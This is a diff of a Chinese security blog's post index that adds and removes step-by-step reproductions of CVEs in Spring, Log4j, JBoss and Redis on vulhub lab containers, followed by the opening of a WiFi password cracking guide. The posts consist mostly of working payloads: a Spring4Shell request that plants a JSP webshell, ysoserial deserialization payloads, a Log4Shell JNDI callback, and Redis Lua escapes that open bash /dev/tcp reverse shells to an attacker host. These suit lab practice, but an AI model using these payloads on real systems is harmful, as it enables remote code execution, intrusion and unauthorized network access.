+<p><img src="/2026/02/08/CVE-2018-1273/1773372888417.png" alt="1773372888417"></p>
+<p>发送到 Repeater 模块</p>
+<p><img src="/2026/02/08/CVE-2018-1273/1773372927639.png" alt="1773372927639"></p>
+<p>将输入请求主题内容替换为下面 payload，其中 touch /tmp/success 可以替换成其他敏感命令</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("touch /tmp/success")]=&amp;password=&amp;repeatedPassword=</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/08/CVE-2018-1273/1773372980982.png" alt="1773372980982"></p>
+<p>发送后返回 500</p>
+<p><img src="/2026/02/08/CVE-2018-1273/1773373020167.png" alt="1773373020167"></p>
+<p>进入容器查看 /tmp 目录下的文件，发现 success，表示命令执行成功</p>
+<p><img src="/2026/02/08/CVE-2018-1273/1773373046364.png" alt="1773373046364"></p>
+]]></content>
+      <categories>
+        <category>漏洞</category>
+      </categories>
+      <tags>
+        <tag>CVE</tag>
+        <tag>Spring</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>WebLogic 远程代码执行漏洞 CVE-2023-21839</title>
     <url>/2026/02/06/CVE-2023-21839/</url>
     <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
@@ -1100,352 +1408,44 @@
       </tags>
   </entry>
   <entry>
-    <title>Log4j 反序列化命令执行漏洞 CVE-2017-5645</title>
-    <url>/2026/02/08/CVE-2017-5645/</url>
+    <title>Spring Framework 远程代码执行漏洞 CVE-2022-22965</title>
+    <url>/2026/02/03/CVE-2022-22965/</url>
     <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
-<li>Apache Log4j 2.0-alpha1 - 2.8.1</li>
+<li><font style="color:rgba(0, 0, 0, 0.75);">Spring Framework &lt; 5.3.18</font></li>
+<li><font style="color:rgba(0, 0, 0, 0.75);">Spring Framework &lt; 5.2.20</font></li>
 </ul>
-<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>Java 反序列化</p>
+<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>参数绑定漏洞</p>
 <h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
-<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><ul>
-<li>启动 Log4j 的 TcpSocketServer 服务，监听 4712 端口（也可指定其他端口）</li>
-</ul>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>命令执行，反弹 shell，植入木马</p>
-<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>Log4j 的 TcpSocketServer 和 UdpSocketServer 类中，在接收日志数据时，没有对数据进行安全检验，直接通过 ObjectInputSteam.readObject() 进行反序列化，攻击者可以构造被序列化的恶意对象链来实现命令执行</p>
+<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><p>无</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>执行命令，可以进行反弹 shell</p>
+<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>利用 Java 特性，对象互通且允许通过点号. 访问属性的属性，在 JDK9 中引入了 Module，Spring 没防住 class.module.classLoader，可以直接通过参数访问到 Tomcat 的类加载器。在 Tomcat 中有一个 AccessLogValve 组件负责记录访问日志，可以通过参数绑定来修改其配置，directory（日志存放目录）、prefix（日志文件名）、suffix（日志后缀）、fileDateFormat（日期后缀）、pattern（日志格式），将目录修改到 Web 根目录，将日志文件名确定，日志后缀改成.jsp，将日期后缀清空，防止文件名额外添加上日期，将 Java 恶意代码注入到日志格式中。最后通过日志功能，当攻击者发送请求，将设定好的文件存放到 Web 根目录，内容即构造的恶意 payload。pattern 模块有一段代码为 pattern=%25 {参数 1} i+ 其他代码 +%25 {参数 2} i，其中两个参数要放到 HTTP 请求头，后面分别接上 &lt;% 和 %&gt;//作为参数替换的内容，最后拼接成一段完整的 jsp 可执行代码。</p>
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>用现成的 vulhub 来拉取镜像</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/log4j/CVE-2017-5645</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/spring/CVE-2022-22965</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
 
-<p><img src="/2026/02/08/CVE-2017-5645/1773547936873.png" alt="1773547936873"></p>
-<p>扫描靶机端口 4712，用 telnet 连接成功连接，说明端口开放</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">telnet 公网ip 被扫描端口</span><br><span class="line">nc -zv 公网ip 被扫描端口</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="/2026/02/03/CVE-2022-22965/1773376841338.png" alt="1773376841338"></p>
+<p>访问 http://公网: 8080</p>
+<p><img src="/2026/02/03/CVE-2022-22965/1773376862511.png" alt="1773376862511"></p>
+<p>用 burpsuite 抓取首页的数据包</p>
+<p><img src="/2026/02/03/CVE-2022-22965/1773376981313.png" alt="1773376981313"></p>
+<p>发送到 Repeater 模块</p>
+<p><img src="/2026/02/03/CVE-2022-22965/1773376942289.png" alt="1773376942289"></p>
+<p>在 GET 请求后添加 payload</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#注入的payload</span><br><span class="line">/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc1%7Di%20java.io.InputStream%20in%20%3D%20Runtime.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bc2%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=final_shell&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=</span><br><span class="line">#Java外壳，加在Host下一行，即HTTP请求头</span><br><span class="line">c1: &lt;%</span><br><span class="line">c2: %&gt;//</span><br></pre></td></tr></tbody></table></figure>
 
-<p><img src="/2026/02/08/CVE-2017-5645/1773547983473.png" alt="1773547983473"></p>
-<p>下载攻击工具并检查是否有 Java 环境</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar -O ysoserial.jar</span><br><span class="line">#检查Java环境</span><br><span class="line">java -version</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/2026/02/08/CVE-2017-5645/1773548027183.png" alt="1773548027183"></p>
-<p>使用工具工具构造 payload，这里执行 touch /tmp/success</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar 利用的攻击链（这里用CommonsCollection6，） "执行的命令" &gt; 文件名.bin</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/2026/02/08/CVE-2017-5645/1773548059369.png" alt="1773548059369"></p>
-<p>使用 nc 将二进制文件传到靶机</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">nc -v 靶机ip 4712 &lt; 工具构造的文件名.bin</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/2026/02/08/CVE-2017-5645/1773548115605.png" alt="1773548115605"></p>
-<p>进入容器查看 /tmp，发现存在 success，说明成功执行命令</p>
-<p><img src="/2026/02/08/CVE-2017-5645/1773548142489.png" alt="1773548142489"></p>
-<p>进行反弹 shell，使用 nc，nc -lvvp 监听端口</p>
-<p><img src="/2026/02/08/CVE-2017-5645/1773548171530.png" alt="1773548171530"></p>
-<p>构造攻击 payload，将执行命令替换成下面这条</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">bash -c {echo,反弹shell的base64编码}|{base64,-d}|{bash,-i}</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/2026/02/08/CVE-2017-5645/1773548204015.png" alt="1773548204015"></p>
-<p>用 nc 将二进制文件传入靶机</p>
-<p><img src="/2026/02/08/CVE-2017-5645/1773548245345.png" alt="1773548245345"></p>
-<p>成功连接</p>
-<p><img src="/2026/02/08/CVE-2017-5645/1773548278116.png" alt="1773548278116"></p>
+<p><img src="/2026/02/03/CVE-2022-22965/1773377030511.png" alt="1773377030511"></p>
+<p>返回响应码 200</p>
+<p><img src="/2026/02/03/CVE-2022-22965/1773377067593.png" alt="1773377067593"></p>
+<p>访问 http://公网: 8080/final_shell.jsp，返回响应码 500 说明成功注入 jsp 文件</p>
+<p><img src="/2026/02/03/CVE-2022-22965/1773377102776.png" alt="1773377102776"></p>
+<p>添加参数 cmd = id，即访问 http://公网: 8080/final_shell.jsp?cmd = id，返回页面如下</p>
+<p><img src="/2026/02/03/CVE-2022-22965/1773377131237.png" alt="1773377131237"></p>
 ]]></content>
       <categories>
         <category>漏洞</category>
       </categories>
       <tags>
         <tag>CVE</tag>
-        <tag>Log4j</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>JBoss 反序列化漏洞 CVE-2017-12149</title>
-    <url>/2026/02/13/CVE-2017-12149/</url>
-    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
-<li>JBoss AS 5.x - JBoss AS 6.1.0.Final</li>
-</ul>
-<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>Java 反序列化</p>
-<h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
-<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><ul>
-<li>http-invoker.sar 必须处于部署状态</li>
-<li>ReadOnlyAccessFilter 过滤器映射</li>
-</ul>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>命令执行，反弹 shell</p>
-<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>在 JBoss AS 5.x 或 6.x 中，引入名为 ReadOnlyAccessFilter 过滤器，其默认映射路径为/invoker/readonly，该路径在默认配置下无需身份验证就可访问，该过滤器处理客户端发送的 POST 请求数据时，直接获取请求体的输入流调用 readObject () 方法进行反序列化操作。在还原对象过程中，系统未对传入二进制流进行安全过滤、字节码校验或白名单限制，攻击者可以构造恶意序列化对象，恶意二进制数据通过 HTTP 请求发送到靶机，JBoss 在解析对象时，自动触发对象内部嵌套的恶意代码，执行恶意命令</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>现成的 vulhub 来拉取镜像</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/jboss/CVE-2017-12149</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/2026/02/13/CVE-2017-12149/1773507525350.png" alt="1773507525350"></p>
-<p>访问 http://靶机 ip:8080/invoker/readonly，返回 500，说明存在漏洞</p>
-<p><img src="/2026/02/13/CVE-2017-12149/1773507561810.png" alt="1773507561810"></p>
-<p>下载攻击工具并检查是否有 Java 环境</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar -O ysoserial.jar</span><br><span class="line">#检查Java环境</span><br><span class="line">java -version</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/2026/02/13/CVE-2017-12149/1773507621279.png" alt="1773507621279"></p>
-<p>使用 ysoserial 生成序列化数据</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections5 "touch /tmp/success" &gt; payload.ser</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/2026/02/13/CVE-2017-12149/1773507653348.png" alt="1773507653348"></p>
-<p>发送恶意 payload</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">curl -X POST http://靶机ip:8080/invoker/readonly --data-binary @payload.ser</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/2026/02/13/CVE-2017-12149/1773507692670.png" alt="1773507692670"></p>
-<p>进入容器 tmp 目录，发现 success，说明成功执行命令</p>
-<p><img src="/2026/02/13/CVE-2017-12149/1773507717667.png" alt="1773507717667"></p>
-<p>下面进行反弹 shell，开启 nc 监听端口</p>
-<p><img src="/2026/02/13/CVE-2017-12149/1773507754209.png" alt="1773507754209"></p>
-<p>执行命令替换为反弹 shell 执行命令</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections5 "bash -c {echo,反弹shell的base64编码}|{base64,-d}|{bash,-i}" &gt; payload.ser</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/2026/02/13/CVE-2017-12149/1773507791344.png" alt="1773507791344"></p>
-<p>发送恶意 payload</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">curl -X POST http://靶机ip:8080/invoker/readonly --data-binary @payload.ser</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/2026/02/13/CVE-2017-12149/1773507874613.png" alt="1773507874613"></p>
-<p>成功连接</p>
-<p><img src="/2026/02/13/CVE-2017-12149/1773507911281.png" alt="1773507911281"></p>
-]]></content>
-      <categories>
-        <category>漏洞</category>
-      </categories>
-      <tags>
-        <tag>CVE</tag>
-        <tag>JBoss</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Log4j2 远程命令执行漏洞 CVE-2021-44228</title>
-    <url>/2026/02/08/CVE-2021-44228/</url>
-    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
-<li>Apache Log4j 2.0-beta9 - 2.14.1</li>
-</ul>
-<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p> JNDI 注入</p>
-<h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
-<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><p>开启端口 8983 和 5005</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>命令执行，反弹 shell</p>
-<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>Log4j 支持 JNDI 协议的 Lookup 功能，该功能运行开发者在日志中动态插入系统属性（语法格式为 ${prefix:name}），而通过 JNDI，Java 查询可以连接外部资源，攻击者在这里用到了 LDAP 目录服务。攻击者在 HTTP Header 或 URL 参数中发送构造的 payload：${jndi:ldap://攻击机 ip:1389/Exploit}，后端处理这个请求时候会把这个 payload 信息写入日志，Log4j 解析 payload 时，靶机向攻击机请求 LDAP 资源，攻击机返回恶意代码，靶机执行恶意代码完成命令执行</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>用现成的 vulhub 来拉取镜像</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/log4j/CVE-2021-44228</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/2026/02/08/CVE-2021-44228/1773549482803.png" alt="1773549482803"></p>
-<p>下载工具 JNDIExploit</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">git clone https://github.com/black9/Log4shell_JNDIExploit.git</span><br><span class="line">cd Log4shell_JNDIExploit</span><br><span class="line">#--如果没有unzip，下载命令yum install -y unzip</span><br><span class="line">unzip JNDIExploit.v1.2.zip</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/2026/02/08/CVE-2021-44228/1773549515834.png" alt="1773549515834"></p>
-<p>使用工具</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 攻击机ip</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/2026/02/08/CVE-2021-44228/1773549568397.png" alt="1773549568397"></p>
-<p>开启 nc 监听</p>
-<p><img src="/2026/02/08/CVE-2021-44228/1773549681946.png" alt="1773549681946"></p>
-<p>输入攻击请求，成功则返回 200</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#url编码部分原文为${jndi:ldap://攻击机:1389/Basic/ReverseShell/攻击机/nc监听端口}</span><br><span class="line">curl -i -k "http://靶机ip:8983/solr/admin/cores?test=%24%7Bjndi%3Aldap%3A%2F%2F攻击机ip%3A1389%2FBasic%2FReverseShell%2F攻击机ip%2F监听端口%7D"</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/2026/02/08/CVE-2021-44228/1773549714204.png" alt="1773549714204"></p>
-<p>JNDIExploit 窗口有回显</p>
-<p><img src="/2026/02/08/CVE-2021-44228/1773549877981.png" alt="1773549877981"></p>
-<p>反弹 shell 成功连接</p>
-<p><img src="/2026/02/08/CVE-2021-44228/1773549916116.png" alt="1773549916116"></p>
-]]></content>
-      <categories>
-        <category>漏洞</category>
-      </categories>
-      <tags>
-        <tag>CVE</tag>
-        <tag>Log4j2</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>JBoss 反序列化漏洞 CVE-2017-7504</title>
-    <url>/2026/02/12/CVE-2017-7504/</url>
-    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
-<li>JBoss AS 3.2.0 - 4.2.3.GA</li>
-</ul>
-<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>Java 反序列化</p>
-<h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
-<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><p>默认配置</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>命令执行，反弹 shell</p>
-<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>JBoss AS 默认集成了一个用于 HTTP 协议传输信息的组件 JBossMQ，其组件含有一个名为 HTTPServerILServlet 的接口，该接口访问路径/jbossmq-httpil/HTTPServerILServlet 无需校验即可访问，Servlet 处理 POST 请求数据时，直接调用 readObject () 方法来反序列化数据流，且未对传入对象进行安全过滤或白名单限制，攻击者利用 yoserial 工具生成恶意系列化二进制数据，通过 HTTP 请求发送到靶机，JBoss 解析对象时自动触发对象内部嵌套的恶意代码</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>现成的 vulhub 来拉取镜像</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/jboss/CVE-2017-7504</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/2026/02/12/CVE-2017-7504/1773506967678.png" alt="1773506967678"></p>
-<p>下载攻击工具并检查是否有 Java 环境</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar -O ysoserial.jar</span><br><span class="line">#检查Java环境</span><br><span class="line">java -version</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/2026/02/12/CVE-2017-7504/1773507049029.png" alt="1773507049029"></p>
-<p>使用 ysoserial 生成序列化数据</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections5 "touch /tmp/success" &gt; payload.ser</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/2026/02/12/CVE-2017-7504/1773507085818.png" alt="1773507085818"></p>
-<p>用 curl 发送 payload</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">curl http://靶机ip:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @payload.ser</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/2026/02/12/CVE-2017-7504/1773507115114.png" alt="1773507115114"></p>
-<p>进入容器查看 tmp 文件夹，发现 success，说明成功复现漏洞</p>
-<p><img src="/2026/02/12/CVE-2017-7504/1773507138029.png" alt="1773507138029"></p>
-<p>下面进行反弹 shell，开启 nc 监听</p>
-<p><img src="/2026/02/12/CVE-2017-7504/1773507180906.png" alt="1773507180906"></p>
-<p>把执行命令换成反弹 shell</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections5 "bash -c {echo,反弹shell的base64编码}|{base64,-d}|{bash,-i}" &gt; payload.ser</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/2026/02/12/CVE-2017-7504/1773507207767.png" alt="1773507207767"></p>
-<p>发送攻击 payload</p>
-<p><img src="/2026/02/12/CVE-2017-7504/1773507261832.png" alt="1773507261832"></p>
-<p>成功连接</p>
-<p><img src="/2026/02/12/CVE-2017-7504/1773507291544.png" alt="1773507291544"></p>
-]]></content>
-      <categories>
-        <category>漏洞</category>
-      </categories>
-      <tags>
-        <tag>CVE</tag>
-        <tag>JBoss</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Redis 沙盒逃逸漏洞 CVE-2022-0543</title>
-    <url>/2026/02/08/CVE-2022-0543/</url>
-    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
-<li>Debian 10 (Buster) Redis 软件包: 5.0 - 5.0.14-1</li>
-<li>Debian 11 (Bullseye) Redis 软件包: 6.0 - 6.0.16-1</li>
-<li>Ubuntu 18.04 LTS Redis 软件包: 4.0.0 - 4.0.9-1ubuntu0.2</li>
-<li>Ubuntu 20.04 LTS Redis 软件包: 5.0.0 - 5.0.7-2ubuntu0.1</li>
-<li>Ubuntu 22.04 LTS Redis 软件包: 6.0.0 - 6.0.15-1ubuntu0.1</li>
-<li>Docker Redis (Debian / Bullseye 变体) 镜像: 5.0.0 - 5.0.14</li>
-<li>Docker Redis (Debian / Bullseye 变体) 镜像: 6.0.0 - 6.0.15</li>
-<li>Kali Linux Redis 软件包: 5.0.0 - 6.0.15</li>
-<li>Raspbian (树莓派) Redis 软件包: 4.0.0 - 6.0.15</li>
-<li>其他 Debian 系衍生版 Redis 软件包: 4.0.0 - 7.0.0-rc2</li>
-</ul>
-<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>Redis Lua 沙箱逃逸</p>
-<h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>Debian/Ubantu</p>
-<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><ul>
-<li>开启 6379 端口</li>
-</ul>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>命令执行，反弹 shell</p>
-<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>官方设计的 Redis 中，Lua 脚本运行在高度受限的沙箱环境，Debian 维护者答辩 Redis 时候加入补丁，将 package 模块引入 Lua 的全局环境，package.loadlib 允许 Lua 直接调用 Linux 系统的动态链接库，攻击者通过 redis-cli 连接到未授权或已知密码的 Redis，且目标一致为 Debian / Ubantu 系统，攻击者知道系统自带 Lua 库位置，利用 package.loadlib 重新加载系统库中的 luaopen_os 或 luaopen_io 函数，将 Redis 删除的 os 和 io 模块重新注入回 Lua 环境，攻击者可以调用 os.execute() 执行系统命令，通过 io.popen() 读取执行后回显结果，可以通过这些特性进行 getshell</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>现成的 vulhub 来拉取镜像</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/redis/CVE-2022-0543</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/2026/02/08/CVE-2022-0543/1773550592914.png" alt="1773550592914"></p>
-<p>安装工具 redis</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sudo yum install redis -y</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/2026/02/08/CVE-2022-0543/1773550685149.png" alt="1773550685149"></p>
-<p>拦截靶机</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">redis-cli -h 靶机ip</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/2026/02/08/CVE-2022-0543/1773550720121.png" alt="1773550720121"></p>
-<p>执行敏感命令</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#执行whoami</span><br><span class="line">eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("whoami", "r"); local res = f:read("*a"); f:close(); return res' 0</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/2026/02/08/CVE-2022-0543/1773582899578.png" alt="1773582899578"></p>
-<p>进行反弹 shell，nc 开启监听</p>
-<p><img src="/2026/02/08/CVE-2022-0543/1773582922673.png" alt="1773582922673"></p>
-<p>执行反弹 shell 命令</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("bash -c \"bash -i &gt;&amp; /dev/tcp/攻击机ip/监听端口 0&gt;&amp;1\"", "r"); f:close();' 0</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/2026/02/08/CVE-2022-0543/1773582986885.png" alt="1773582986885"></p>
-<p>成功连接</p>
-<p><img src="/2026/02/08/CVE-2022-0543/1773583010143.png" alt="1773583010143"></p>
-]]></content>
-      <categories>
-        <category>漏洞</category>
-      </categories>
-      <tags>
-        <tag>CVE</tag>
-        <tag>Redis</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>WIFI 密码破解</title>
-    <url>/2026/03/16/WIFI%20HACK/</url>
-    <content><![CDATA[<p>未连接网卡时候</p>
-<p>![1773412831699](2026/03/16/WIFI HACK/1773412831699.png)</p>
-<p>接入 USB 无线网卡设备后，虚拟机设置选中连接虚拟机</p>
-<p>![1773412872695](2026/03/16/WIFI HACK/1773412872695.png)</p>
-<p>可选网络出现当前局域网信息，表明网卡接入成功</p>
-<p>![1773412906900](2026/03/16/WIFI HACK/1773412906900.png)</p>
-<p>查看新加入的网络名称为 wlan0</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></tbody></table></figure>
-
-<p>![1773413147946](2026/03/16/WIFI HACK/1773413147946.png)</p>
-<p>关闭该网卡后查看网卡状态</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#关闭指定网卡</span><br><span class="line">ifconfig wlan0 down</span><br><span class="line">#查看全部网卡状态</span><br><span class="line">ip address</span><br></pre></td></tr></tbody></table></figure>
-
-<p>![1773413317503](2026/03/16/WIFI HACK/1773413317503.png)</p>
-<p>给无线网卡设置虚假 mac 地址，并开启无线网卡监听模式</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">macchanger --mac 伪造mac地址 wlan0</span><br><span class="line">airmon-ng start wlan0</span><br></pre></td></tr></tbody></table></figure>
-
-<p>![1773413666703](2026/03/16/WIFI HACK/1773413666703.png)</p>
-<p>查看当前无线设备，并通过该无线网卡搜索周围无线信号</p>
